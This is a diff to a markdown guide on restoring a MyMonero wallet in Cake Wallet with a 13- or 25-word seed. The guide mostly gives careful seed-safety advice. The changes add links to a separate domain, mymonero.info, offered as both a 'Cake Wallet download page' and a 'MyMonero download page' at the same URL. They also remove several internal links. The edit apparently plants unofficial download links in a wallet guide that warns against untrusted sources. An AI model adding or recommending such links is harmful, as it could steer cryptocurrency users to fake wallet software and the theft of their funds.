@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 You can restore a MyMonero wallet in Cake Wallet by choosing the restore/import option and entering the seed phrase that belongs to that wallet. First identify whether your seed has 13 or 25 words, protect it from disclosure, and allow the wallet to scan from an appropriate restore height.
 
+
+For a second walkthrough, see [MyMonero to cake wallet on mymonero.info](https://mymonero.info/mymonero-to-cake-wallet). The site also keeps a [Cake Wallet download page](https://mymonero.info/github/cake-developments) and an overview of [MyMonero safety facts](https://mymonero.info/is-mymonero-safe).
+
 ## You'll see this if
 - You want to use a wallet on a phone or another supported computer.
 - MyMonero’s hosted login or web access is unavailable, but you still have your recovery phrase.
@@ -40,10 +43,10 @@ A 13-word MyMonero seed is a MyMonero-specific legacy format; a 25-word seed is 
 2. **Confirm the format.** Count the words without exposing them to anyone. A MyMonero-specific phrase may contain 13 words; a standard Monero phrase has 25. If you cannot identify the format, pause rather than guessing. The guide to [MyMonero seed word counts](./mymonero-seed-13-vs-25-words.md) explains the distinction.
 3. **Install Cake Wallet from a source you trust.** Use the official Cake Wallet distribution channel for the operating system you intend to use. Availability differs by platform; Windows desktop builds are paused at the time of writing. Do not install an app supplied by a stranger or a search advertisement.
 4. **Choose restore or import.** In Cake Wallet, use the option to restore an existing wallet, not the option to create a new wallet. Follow the app’s prompts for the seed format. Enter the phrase only into the wallet application you have deliberately installed and verified. If the app rejects it, stop and check spelling, word count, and selected format; avoid repeated random edits.
-5. **Set the restore height.** Restore height tells the wallet where to begin scanning. If known, use a height at or before the wallet’s creation or earliest relevant activity. An earlier height is safer when uncertain, but means a longer scan. Read [restore height explained](./mymonero-restore-height-explained.md) before choosing.
+5. **Set the restore height.** Restore height tells the wallet where to begin scanning. If known, use a height at or before the wallet’s creation or earliest relevant activity. An earlier height is safer when uncertain, but means a longer scan. Read restore height explained before choosing.
 6. **Let scanning finish.** Keep the device connected and give the wallet time to synchronize. A balance that has not appeared yet does not by itself mean that funds are gone. Check the scan status and height before changing settings or restoring again.
 7. **Verify access cautiously.** Compare the displayed wallet information with what you expect, and consider a small receive or send only after understanding the fees and destination. Never send a recovery phrase to “verify” a wallet. A seed restores wallet access; it is not a payment address.
-8. **Keep a safe backup.** Store the seed offline in a private place you control. Do not rely on an app installation, cloud note, or screenshot as the only backup. The [safe seed backup guide](./mymonero-backup-seed-safely.md) covers practical precautions.
+8. **Keep a safe backup.** Store the seed offline in a private place you control. Do not rely on an app installation, cloud note, or screenshot as the only backup. The safe seed backup guide covers practical precautions.
 
 > [!TIP]
 > You do not need to empty the old wallet merely because you restored it in another app. Restoring the same seed provides access to the same wallet; a sweep is a separate transaction to a different wallet.
@@ -52,7 +55,7 @@ A 13-word MyMonero seed is a MyMonero-specific legacy format; a 25-word seed is 
 > Anyone who obtains your seed may be able to control the wallet. Never share it with support, a supposed recovery service, or someone claiming to be from a wallet team.
 
 ## If that did not work
-If the phrase is rejected, stop before trying variations from memory. Confirm whether you have 13 or 25 words, check each word against your own written backup, and verify that you selected the corresponding restore flow. A missing or uncertain word is not a reason to send the partial phrase to another person. See [seed not accepted](./mymonero-seed-not-accepted.md) for safe checks.
+If the phrase is rejected, stop before trying variations from memory. Confirm whether you have 13 or 25 words, check each word against your own written backup, and verify that you selected the corresponding restore flow. A missing or uncertain word is not a reason to send the partial phrase to another person. See seed not accepted for safe checks.
 
 If the wallet opens but shows no balance, first allow the scan to complete. Then review the restore height: starting too late can omit earlier activity, while starting earlier can take longer. Use the explanation of a zero balance after restore for further checks. Error 523 is general guidance that a server connection is unavailable; it does not establish that a seed or balance is invalid.
 
@@ -90,6 +93,7 @@ Windows desktop builds are paused at the time of writing. Cake Wallet runs on iO
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/cake-developments)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
